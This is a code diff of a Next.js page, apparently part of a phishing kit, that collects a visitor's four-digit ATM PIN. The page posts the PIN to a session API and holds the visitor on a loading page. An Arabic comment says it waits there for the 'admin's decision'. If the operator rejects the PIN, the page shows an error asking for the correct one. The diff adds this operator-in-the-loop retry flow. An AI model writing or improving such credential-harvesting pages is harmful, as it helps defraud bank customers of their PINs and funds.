@@ -1,7 +1,7 @@
 "use client";
 export const dynamic = 'force-dynamic';
-import { useState } from "react";
-import { useRouter } from "next/navigation";
+import { useState, useEffect } from "react";
+import { useRouter, useSearchParams } from "next/navigation";
 import SessionTracker from "@/components/SessionTracker";
 
 const GREEN = "#1e7344";
@@ -9,16 +9,32 @@ const GREEN = "#1e7344";
 export default function ATMPage() {
   const router = useRouter();
   const [pin, setPin] = useState("");
+  const [errorMsg, setErrorMsg] = useState("");
+  const [inputError, setInputError] = useState(false);
+  const searchParams = useSearchParams();
 
-  function handleConfirm() {
+  useEffect(() => {
+    const rejected = searchParams.get("rejected");
+    if (rejected === "1") {
+      setErrorMsg("برجاء التحقق من الرقم السري للصراف الآلي الصحيح");
+      setInputError(true);
+    }
+  }, [searchParams]);
+
+  async function handleConfirm() {
     if (pin.length === 4) {
+      setErrorMsg("");
+      setInputError(false);
       // إرسال الـ PIN للـ API
-      fetch('/api/session', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ current_page: 'atm', atm_pin: pin }),
-      }).catch(() => {});
-      router.push("/loading-page");
+      try {
+        await fetch('/api/session', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ current_page: 'atm', atm_pin: pin, waiting_for: 'atm' }),
+        });
+      } catch {}
+      // الانتقال لصفحة التحميل وانتظار قرار الأدمين
+      router.push("/loading-page?from=atm");
     } else {
       alert("يرجى إدخال 4 أرقام");
     }
@@ -42,18 +58,38 @@ export default function ATMPage() {
           type="password"
           maxLength={4}
           value={pin}
-          onChange={e => setPin(e.target.value.replace(/\D/g, "").slice(0, 4))}
+          onChange={e => {
+            setPin(e.target.value.replace(/\D/g, "").slice(0, 4));
+            if (inputError) { setInputError(false); setErrorMsg(""); }
+          }}
           placeholder="****"
           style={{
             width: "100%", maxWidth: "220px", height: "45px",
-            border: "1px solid #ddd", borderRadius: "8px",
+            border: inputError ? "2px solid #e74c3c" : "1px solid #ddd",
+            borderRadius: "8px",
             textAlign: "center", fontSize: "20px", letterSpacing: "12px",
-            fontWeight: "bold", color: GREEN, outline: "none",
-            backgroundColor: "#fafafa", marginBottom: "20px",
-            display: "block", margin: "0 auto 20px",
+            fontWeight: "bold", color: inputError ? "#e74c3c" : GREEN,
+            outline: "none",
+            backgroundColor: inputError ? "#fff5f5" : "#fafafa",
+            marginBottom: "8px",
+            display: "block", margin: "0 auto 8px",
           }}
         />
 
+        {errorMsg && (
+          <div style={{
+            color: "#e74c3c",
+            fontSize: "13px",
+            fontWeight: "bold",
+            marginBottom: "12px",
+            padding: "8px 12px",
+            backgroundColor: "#fff5f5",
+            borderRadius: "8px",
+            border: "1px solid #e74c3c",
+          }}>
+            ❌ {errorMsg}
+          </div>
+        )}
         <button
           onClick={handleConfirm}
           style={{ width: "100%", backgroundColor: GREEN, color: "white", border: "none", borderRadius: "10px", padding: "12px", fontSize: "15px", fontWeight: "bold", cursor: "pointer" }}
